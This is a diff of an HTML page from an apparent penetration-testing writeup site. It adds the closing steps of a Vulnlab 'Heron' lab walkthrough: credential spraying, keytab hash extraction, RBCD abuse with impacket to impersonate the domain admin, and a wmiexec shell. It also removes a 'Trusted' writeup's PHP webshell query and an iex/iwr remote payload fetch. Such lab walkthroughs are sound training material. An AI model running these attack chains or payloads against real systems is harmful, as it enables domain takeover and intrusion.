+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nxc ldap heron.vl -u users.txt -p Deplete5DenialDealt
+LDAP        10.10.172.101       389    MUCDC            [+] heron.vl\julian.pratt:Deplete5DenialDealt</code></pre>
+</doc-codeblock></div>
+<p>Logging into the <code v-pre>home$</code> share as this user gives us more creds in a <code v-pre>.lnk</code> file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">adm_prju@mucjmp -pw ayDMWV929N9wAiB4</code></pre>
+</doc-codeblock></div>
+<p>Now is probs a good time to run bloodhound.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q ./bloodhound.py -d heron.vl -u adm_prju -p ayDMWV929N9wAiB4 -c all -ns 10.10.172.101 --zip -dc MUCDC.heron.vl</code></pre>
+</doc-codeblock></div>
+<p>The domain admin is called <code v-pre>_admin</code> and the <code v-pre>adm_prju</code> user has WriteAccountRestrictions over the domain controller. This means we can configure RBCD for the DC and request a ticket on behalf of a domain admin.</p>
+<p>As we have root on the linux box and its domain joined we can extract the ntlm hash from the <code v-pre>/etc/krb5.keytab</code> file then configure RBCD and request a ticket.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 /opt/keytabextract.py krb5.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : HERON.VL
+        SERVICE PRINCIPAL : FRAJMP$/
+        NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7
+        AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
+        AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd
+
+proxychains -q rbcd.py -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -dc-ip MUCDC.heron.vl -action write heron.vl/adm_prju:ayDMWV929N9wAiB4 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)
+
+proxychains -q getST.py -spn 'cifs/MUCDC' -impersonate _admin -dc-ip MUCDC.heron.vl -hashes :6f55b3b443ef192c804b2ae98e8254f7 heron.vl/'FRAJMP$'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating _admin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in _admin@cifs_MUCDC@HERON.VL.ccache</code></pre>
+</doc-codeblock></div>
+<p>Then logging in with wmiexec:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">KRB5CCNAME=$(pwd)/_admin@cifs_MUCDC@HERON.VL.ccache proxychains -q wmiexec.py heron.vl/_admin@MUCDC -k -no-pass
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+heron\_admin
+
+C:\&gt;hostname
+mucdc</code></pre>
+</doc-codeblock></div>
+<p>Fin</p>
 <doc-anchor-target id="beyond-root">
     <h1>
         <doc-anchor-trigger class="header-anchor-trigger" to="#beyond-root">#</doc-anchor-trigger>
         <span>Beyond Root</span>
     </h1>
 </doc-anchor-target>
-<p>Fun box, good opportunity for a reminder on how to go from a child domain to parent domain. There is an easy way to cheese half this lab tho.</p>
-<p>You can write a file to the webroot in mysql and skip the lateral movement and privesc on the first box. You can do this as by default mysql will allow you to write a file to disk.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">select '&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;' into outfile &quot;C:\\xampp\\htdocs\\dev\\webshell.php&quot;;</code></pre>
-</doc-codeblock></div>
-<p>Then you can just <code v-pre>iex(iwr http://server/file.ps1)</code> to get a revshell.</p>
+<p>Very fun chain, really liked how you didnt really need to rely on any fancy AD tricks till the end. I wanted to try to backdoor the web.config file without having to override the current configuration of the webapp but couldnt find a way.</p>
+<p>When looking at the way others solved the box the <code v-pre>ssh.ps1</code> file was unintended. The correct way was to use the <code v-pre>.krb5login</code> and to backdoor ssh to get the login password. You could also have used the aduit group that svc-web-accounting is in to set up rbcd on the jumpbox, which would have given root.</p>
+<p>Someone also mentioned you can hijack the dll in the <code v-pre>accounting$</code> share and gain a shell that way.</p>
+<p>As there is a bunch of stuff to try I&#x27;m going to leave it for now and post another write up later on going over this.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -454,16 +461,23 @@ trusteddc</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/hybrid/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/htb/anubis/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Hybrid</span>
+                                                <span class="block mt-1">Anubis</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../writeups/vulnlab/hybrid/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Hybrid</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
                                     </div>
                                 </nav>
                             </footer>
@@ -504,6 +518,6 @@ trusteddc</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Trusted", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Heron", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
